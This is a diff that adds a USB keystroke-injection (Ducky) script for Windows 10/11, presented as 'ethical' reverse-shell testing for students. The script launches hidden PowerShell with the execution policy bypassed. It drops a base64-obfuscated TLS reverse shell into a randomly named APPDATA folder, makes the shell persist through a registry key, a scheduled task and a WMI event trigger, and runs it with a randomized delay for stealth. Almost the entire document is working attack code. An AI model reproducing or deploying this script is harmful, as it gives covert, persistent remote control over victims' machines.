@@ -1,0 +1,59 @@
+
+
+REM Advanced Ducky Script for Ethical Reverse Shell Testing
+REM Target: Windows 10/11
+REM Purpose: Highly stealthy, persistent reverse shell for advanced student testing
+REM Listener: TLS-enabled server required (e.g., Python TLS server on 127.0.0.1:8443)
+REM Enhancements: Multi-layer persistence, advanced obfuscation, TLS encryption, minimal traces
+
+DELAY 2000
+REM Extended delay to mimic natural USB detection timing
+
+GUI r
+DELAY 300
+REM Open Run dialog subtly
+
+STRING powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden
+ENTER
+DELAY 800
+REM Launch hidden PowerShell, bypass restrictions, longer delay for reliability
+
+REM Create randomized hidden directory for payload
+STRING $r = -join ((65..90) + (97..122) | Get-Random -Count 8); $h = "$env:APPDATA\$r"; mkdir $h -Force; $p = "$h\s$(-join ((65..90) + (97..122) | Get-Random -Count 6)).ps1";
+ENTER
+DELAY 100
+REM Generate random directory and file names (e.g., %APPDATA%\KjHsPxQt\sAbCdEf.ps1)
+
+REM Save heavily obfuscated TLS reverse shell
+STRING Set-Content -Path $p -Value ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JAB4AD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAE4AQwBPAEQASQBOAEcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAEkATgBHACgAWwBTAHkAcwB0AGUAbQAuAEMATwBOAFYAZQByAFQAXQA6ADoARgByAE8ATQBCAGEAcwBlADYANABTAFQAcgBpAG4AZwAoACcAUgBlAGQAaQByAGUAYwB0AFIAZQBmAGUAcgBlAG4AYwBlAHMAIAA9ACAAJABuAHUAbABsADsAJABzAD0AWwBOAGUAdAAuAFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB0AG8AYwBvAGwAcwAuAFMAcwBsAFAAcgBvAHQAbwBjAG8AbAAyAF0AOwBbAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAEUAcgB2AGUAcgBDAEUAcgB0AGkAZgBJAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAEIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAIAB9ADsAJABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAE8AQwBrAEUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAiADEAMgA3AC4AMAAuADAALgAxACIAKQA7ACQAdAA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7ACQAcwB0AD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAEUAYwB1AHIAaQB0AHkALgBTAGUAYwB1AHIAZQBTAGUAcgB2AGUAcgBTADQANABDAHIAZQBEAGUAbgB0AGkAYQBsACgAJAB0ACwAWwBOAGUAdAAuAFMAZQBjAHUAcgBpAHQAeQBQAHIAbwB0AG8AYwBvAGwAcwAuAFMAcwBsAFAAcgBvAHQAbwBjAG8AbAAyAF0AKQA7ACQAcwB0AC4AVwByAGkAdABlAEEAbgBkAEYAbAB1AHMAaAAoACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQARAB5AHQAZQBzACgAIgBDAE8ATgBOAEUAQwB0AEkATwBOAF8AUgBFADQAUwBFAHQAIAAiACkAKQA7ACQAYgA9ADAALgAuADYANAA1ADMANQA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpAD0AJABzAHQALgBSAGUAYQBkACgAJABiACwAMAAsACQAYgAuAEwAZQBuAGcAdABoACkAKQAtAG4AZQAwACkAewAkAGQAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACQAaQApADsAJABvAD0AKABpAGUAeAAgACQAZAAgADIAJgAxAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkAOwAkAG8AMgA9ACQAbwArACcAUABTACAAJwArACgAcAB3AGQAKQAuAFAAQQB0AGgAKwAnAD4AIAAnADsAJABzAHQALgBXAHIAaQB0AGUAYQBuAGQARgBsAHUAcwBoACgAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAMQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAGUAdABlAHMAKAAkAG8AMgApACkAfQA7ACQAcwB0AC4AQwBsAG8AcwBlACgAKQA7ACQAYwAuAEMAbABvAHMAZQApADsA')));
+ENTER
+DELAY 100
+REM Save double-obfuscated TLS reverse shell to random file (e.g., sAbCdEf.ps1)
+
+REM Add persistence via randomized registry key
+STRING $k = "HKCU\Software\$(-join ((65..90) + (97..122) | Get-Random -Count 8))"; reg add $k /v Core /t REG_SZ /d "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $p" /f
+ENTER
+DELAY 100
+REM Create random registry key (e.g., HKCU\Software\XzPqRtMn) for persistence
+
+REM Add persistence via obfuscated scheduled task
+STRING $t = "Task$(-join ((65..90) + (97..122) | Get-Random -Count 6))"; schtasks /create /tn $t /tr "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $p" /sc onidle /i 5 /f
+ENTER
+DELAY 100
+REM Create random scheduled task (e.g., TaskQwErTy) to run after 5 minutes of idle time
+
+REM Add persistence via WMI event
+STRING $w = "WMI$(-join ((65..90) + (97..122) | Get-Random -Count 6))"; $q = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"; Register-WmiEvent -Query $q -SourceIdentifier $w -Action { Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File $p" };
+ENTER
+DELAY 100
+REM Create WMI event trigger with random name to run on system activity
+
+REM Execute immediately with randomized delay
+STRING Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 5000); Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File $p"
+ENTER
+DELAY 100
+REM Run script after random delay (1-5 seconds) for stealth
+
+STRING exit
+ENTER
+REM Exit PowerShell to minimize visibility
